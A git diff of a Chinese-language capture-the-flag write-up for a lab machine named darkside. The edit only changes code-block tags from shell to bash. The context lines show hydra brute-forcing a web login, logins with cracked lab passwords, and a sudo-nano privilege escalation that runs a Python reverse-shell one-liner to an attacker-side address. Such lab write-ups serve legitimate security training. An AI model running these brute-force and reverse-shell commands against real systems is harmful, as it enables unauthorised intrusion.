@@ -88,7 +88,7 @@ kevin
 
 根据提示，针对 `kevin` 用户发起攻击
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $hydra -v -V -l kevin -P /usr/share/wordlists/rockyou.txt -I 192.168.56.107 http-post-form "/:user=kevin&pass=^PASS^:invalid"
 ......
@@ -160,7 +160,7 @@ kevin:ILoveCalisthenics
 
 ## User - kevin
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs kevin@192.168.56.107
 [16:42:59] Welcome to pwncat 🐈!
@@ -174,7 +174,7 @@ kevin
 
 ### flag - user
 
-```shell
+```bash
 (remote) kevin@darkside:/home/kevin$ cat user.txt
 UnbelievableHumble
 ```
@@ -205,7 +205,7 @@ Sorry, user kevin may not run sudo on darkside.
 
 ### 读取命令行历史
 
-```shell title="/home/kevin/.history"
+```bash title="/home/kevin/.history"
 ls -al
 hostname -I
 echo "Congratulations on the OSCP Xerosec"
@@ -224,7 +224,7 @@ rijaba:ILoveJabita
 
 ## User - rijaba
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs rijaba@192.168.56.107
 [17:02:02] Welcome to pwncat 🐈!
@@ -248,13 +248,13 @@ User rijaba may run the following commands on darkside:
 
 尝试提权
 
-```shell
+```bash
 (remote) rijaba@darkside:/home/rijaba$ sudo /usr/bin/nano
 ```
 
 然后 `Ctrl` + `T`，执行指令
 
-```shell
+```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
 
@@ -262,7 +262,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ## User - root
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 9999
 [17:07:03] Welcome to pwncat 🐈!
@@ -275,7 +275,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 (remote) root@darkside:/root# cat root.txt 
   ██████╗░░█████╗░██████╗░██╗░░██╗░██████╗██╗██████╗░███████╗
   ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██║██╔══██╗██╔════╝
